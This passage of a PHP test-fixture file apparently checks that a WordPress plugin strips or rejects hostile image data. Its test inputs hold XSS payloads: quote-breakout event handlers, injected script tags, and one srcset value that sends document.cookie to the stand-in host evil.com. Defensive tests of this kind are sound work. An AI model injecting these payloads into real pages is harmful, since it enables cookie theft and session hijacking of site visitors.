			'result' => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],
	/**
	 * Test Case: XSS attempt via srcset with onload event handler
	 * Should sanitize/reject malicious srcset containing onload
	 */
	'testXSSInSrcsetOnload' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.webp" onload="fetch(\'https://evil.com?c=\'+document.cookie)',
									'media'  => '',
									'type'   => 'image/webp',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'webp',
				'type' => 'image/webp',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],
	/**
	 * Test Case: XSS attempt via media attribute
	 * Should sanitize/reject malicious media query containing event handlers
	 */
	'testXSSInMediaAttribute' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif',
									'media'  => 'screen" onfocus="alert(1)',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => [
				'jpg|jpeg|jpe' => 'image/jpeg',
				'png'          => 'image/png',
				'gif'          => 'image/gif',
				'webp'         => 'image/webp',
				'avif'         => 'image/avif',
			],
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],
	/**
	 * Test Case: XSS attempt via sizes attribute
	 * Should sanitize/reject malicious sizes containing event handlers
	 */
	'testXSSInSizesAttribute' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif',
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '100vw" onload="alert(document.domain)',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt with HTML angle brackets in srcset
	 * Should reject srcset containing < or > characters
	 */
	'testXSSWithAngleBrackets' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif<script>alert(1)</script>',
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url'          => 'http://example.org/test-page',
				'is_mobile'    => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport'     => json_encode( [] ),
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt with single quotes in srcset
	 * Should reject srcset containing single quotes
	 */
	'testXSSWithSingleQuotes' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => "image.avif' onclick='alert(1)",
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt with multiple event handlers in one source
	 * Should reject source with multiple XSS vectors
	 */
	'testXSSMultipleEventHandlers' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif" onerror="alert(1)',
									'media'  => 'screen" onfocus="alert(2)',
									'type'   => 'image/avif',
									'sizes'  => '100vw" onload="alert(3)',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt across multiple sources
	 * Should reject entire picture if any source contains malicious content
	 */
	'testXSSMultipleSources' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif',
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
								[
									'srcset' => 'image.webp" onerror="alert(1)',
									'media'  => '',
									'type'   => 'image/webp',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: Invalid MIME type (text/html)
	 * Should reject sources with non-image MIME types
	 */
	'testInvalidMimeTypeHTML' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'malicious.html',
									'media'  => '',
									'type'   => 'text/html',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => false,
				'type' => false,
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: Invalid MIME type (application/javascript)
	 * Should reject sources with JavaScript MIME type
	 */
	'testInvalidMimeTypeJavaScript' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'script.js',
									'media'  => '',
									'type'   => 'application/javascript',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => false,
				'type' => false,
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	// ========================================================================
	// XSS VULNERABILITY TEST CASES - img-srcset
	// ========================================================================

	/**
	 * Test Case: XSS attempt via img-srcset's srcset with onerror event handler
	 * Should reject the whole img-srcset object (no partial storage).
	 */
	'testXSSInImgSrcsetOnerror' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => 'image.jpg" onerror="alert(1)',
							'sizes'  => '',
							'label'  => 'lcp',
						],
					],
				]
			),
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt via img-srcset's srcset with angle brackets/<script>
	 * Should reject the whole img-srcset object.
	 */
	'testXSSInImgSrcsetAngleBrackets' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => 'image.jpg<script>alert(1)</script>',
							'sizes'  => '',
							'label'  => 'lcp',
						],
					],
				]
			),
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt via img-srcset's srcset with quote-breakout
	 * Should reject the whole img-srcset object.
	 */
	'testXSSInImgSrcsetSingleQuotes' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => "image.jpg' onclick='alert(1)",
							'sizes'  => '',
							'label'  => 'lcp',
						],
					],
				]
			),
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: hostile `sizes` with an otherwise-valid `srcset`
	 * The object is kept, `srcset` is stored normally, `sizes` falls back to ''.
	 */
	'testXSSInImgSizesAttribute' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
							'sizes'  => '100vw" onload="alert(1)',
							'label'  => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => json_encode(
					(object) [
						'type'   => 'img-srcset',
						'src'    => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
						'sizes'  => '',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => json_encode(
					(object) [
						'type'   => 'img-srcset',
						'src'    => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
						'sizes'  => '',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: missing/empty `srcset` on an img-srcset object
	 * Should reject the whole object, same as an explicitly empty string.
	 */
	'testImgSrcsetMissingField' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'  => 'img-srcset',
							'src'   => 'http://example.org/wp-content/uploads/image.jpg',
							'sizes' => '',
							'label' => 'lcp',
						],
					],
				]
			),
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: legitimate multi-descriptor srcset + valid sizes
	 * Proves Acceptance Criterion 1 - no regression for valid img-srcset payloads.
	 */
	'testValidImgSrcset' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
							'sizes'  => '(max-width: 600px) 480px, 800px',
							'label'  => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => json_encode(
					(object) [
						'type'   => 'img-srcset',
						'src'    => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
						'sizes'  => '(max-width: 600px) 480px, 800px',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => json_encode(
					(object) [
						'type'   => 'img-srcset',
						'src'    => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
						'sizes'  => '(max-width: 600px) 480px, 800px',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: bg_set item carries an extra attacker-added property
	 * Only `src` (sanitized) should survive into the stored object.
	 */
	'testBgSetExtraPropertyStripped' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'bg-img',
							'src'    => '',
							'bg_set' => [
								[
									'src'     => 'http://example.org/anotherlcp.jpg',
									'onerror' => 'alert(document.domain)',
								],
							],
							'label'  => 'lcp',
						],
					],
				]
			),
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => json_encode(
					(object) [
						'type'   => 'bg-img',
						'bg_set' => [
							[
								'src' => 'http://example.org/anotherlcp.jpg',
							],
						],
						'src'    => '',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => json_encode(
					(object) [
						'type'   => 'bg-img',
						'bg_set' => [
							[
								'src' => 'http://example.org/anotherlcp.jpg',
							],
						],
						'src'    => '',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	// ========================================================================
	// EDGE CASES
	// ========================================================================

	/**
	 * Test Case: Empty sources array
	 * Should handle empty sources gracefully
	 */
	'testEmptySourcesArray' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: Missing required srcset field
	 * Should reject source missing srcset
	 */
	'testMissingSrcsetField' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => '',
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: Missing required type field
	 * Should reject source missing MIME type
	 */
	'testMissingTypeField' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => '/wp-content/uploads/image.avif',
									'media'  => '',
									'type'   => '',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => false,
				'type' => false,
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],
];
